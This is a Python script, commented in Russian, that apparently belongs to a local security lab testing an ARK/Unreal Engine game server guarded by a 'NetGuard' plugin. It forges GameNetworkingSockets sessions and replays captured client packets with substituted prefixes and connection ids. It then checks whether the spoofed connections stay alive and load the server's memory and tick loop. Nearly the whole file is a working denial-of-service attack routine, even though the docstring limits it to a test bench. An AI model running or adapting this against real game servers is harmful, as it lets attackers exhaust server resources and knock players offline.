# -*- coding: utf-8 -*-
"""
ark_lab_gns_persist.py — поиск способа сделать поддельные соединения ПОСТОЯННЫМИ.

Зачем: сейчас каждый подделанный пакет создаёт UNetConnection, который сразу
уничтожается (хендшейк не завершён). Постоянное соединение было бы сильнее:
стоимость переносится с атакующего на сервер (память + итерации по соединениям
в каждом тике) до истечения таймаута.

Стратегия: повторить последовательность настоящего клиента (перехват
gns_relay_capture.jsonl) на подделанной GNS-сессии, подставляя свой префикс,
и смотреть ответы сервера + счётчик живых соединений NetGuard.

Только локальный стенд.
"""
from __future__ import annotations

import argparse
import io
import json
import os
import re
import socket
import struct
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
from ark_lab_metrics import NetGuardClient  # noqa: E402
from ark_lab_gns_amp import forge_session, gns_data  # noqa: E402

CAPTURE = r"C:\Dev\_research\security\out\gns_relay_capture.jsonl"


def capture_client_packets(limit: int = 8) -> list[bytes]:
    """Первые data-пакеты клиента из перехвата (как есть, с SNP-обвязкой)."""
    if not os.path.exists(CAPTURE):
        return []
    recs = [json.loads(l) for l in io.open(CAPTURE, encoding="utf-8") if l.strip()]
    out = []
    for r in recs:
        if r["dir"] == "c2s" and r["lead"] in (0x80, 0x81):
            out.append(bytes.fromhex(r["hex"]))
            if len(out) >= limit:
                break
    return out


def ue4_level_packets(limit: int = 6) -> list[bytes]:
    """UE4-пакеты настоящего клиента из захвата NetGuard (первая сессия)."""
    p = r"C:\asmdata\Servers\Server2\ShooterGame\Binaries\Win64\ArkApi\Plugins\NetGuard\NetGuard_capture.log"
    if not os.path.exists(p):
        return []
    d = io.open(p, encoding="utf-8", errors="replace").read()
    out = []
    conn = None
    for m in re.finditer(r"\[pkt conn=(\S+) len=(\d+)\] ([0-9a-f]*)", d):
        c = m.group(1)
        if conn is None:
            conn = c
        if c != conn:
            break
        out.append(bytes.fromhex(m.group(3)))
        if len(out) >= limit:
            break
    return out


def main() -> int:
    ap = argparse.ArgumentParser(description="Поиск постоянных поддельных соединений")
    ap.add_argument("--host", default="192.168.8.218")
    ap.add_argument("--game-port", type=int, default=7778)
    ap.add_argument("--metrics-port", type=int, default=27101)
    ap.add_argument("--prefix", default="5b17b519")
    ap.add_argument("--wait", type=float, default=2.0)
    ap.add_argument("--mode", choices=("ue4", "gns-copy", "both"), default="both")
    args = ap.parse_args()

    m = NetGuardClient("127.0.0.1", args.metrics_port).connect()
    st0 = m.status()
    print("до : live=%s total=%s attempts=%s tps=%s" % (
        st0.get("liveConnections"), st0.get("totalConnections"),
        st0.get("connectionAttempts"), st0.get("tps")))

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(args.wait)
    sock.bind(("0.0.0.0", 0))
    srv = forge_session(args.host, args.game_port, sock, verbose=True)
    prefix = bytes.fromhex(args.prefix)

    def drain(tag: str) -> None:
        while True:
            try:
                sock.settimeout(0.5)
                r, _ = sock.recvfrom(4096)
            except socket.timeout:
                return
            except OSError:
                return
            lead = r[0]
            if lead in (0x80, 0x81):
                to = struct.unpack_from("<I", r, 1)[0]
                seq = struct.unpack_from("<H", r, 5)[0]
                print("   %s <- data to=0x%08x seq=%d payload=%s" % (tag, to, seq, r[7:7 + 40].hex()))
            else:
                print("   %s <- lead=0x%02x %s" % (tag, lead, r[:32].hex()))

    seq = 0
    if args.mode in ("ue4", "both"):
        print("\n-- вариант A: UE4-пакеты клиента (префикс подменён) --")
        for p in ue4_level_packets(6):
            seq += 1
            body = prefix + p[4:]
            sock.sendto(gns_data(srv, seq, seq, body), (args.host, args.game_port))
            print("   -> data#%d payload=%d Б %s" % (seq, len(body), body.hex()[:80]))
            time.sleep(0.2)
            drain("A")
            st = m.status()
            print("      live=%s attempts=%s" % (st.get("liveConnections"), st.get("connectionAttempts")))

    if args.mode in ("gns-copy", "both"):
        print("\n-- вариант B: копия GNS-пакетов клиента (замена to_conn_id) --")
        for raw in capture_client_packets(4):
            seq += 1
            # подменяем адрес получателя на наш server_connection_id
            body = bytearray(raw)
            struct.pack_into("<I", body, 1, srv & 0xFFFFFFFF)
            sock.sendto(bytes(body), (args.host, args.game_port))
            print("   -> data#%d len=%d" % (seq, len(body)))
            time.sleep(0.2)
            drain("B")
            st = m.status()
            print("      live=%s attempts=%s" % (st.get("liveConnections"), st.get("connectionAttempts")))

    time.sleep(1.5)
    st1 = m.status()
    print("\nпосле: live=%s total=%s attempts=%s tps=%s" % (
        st1.get("liveConnections"), st1.get("totalConnections"),
        st1.get("connectionAttempts"), st1.get("tps")))
    sock.close()
    m.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
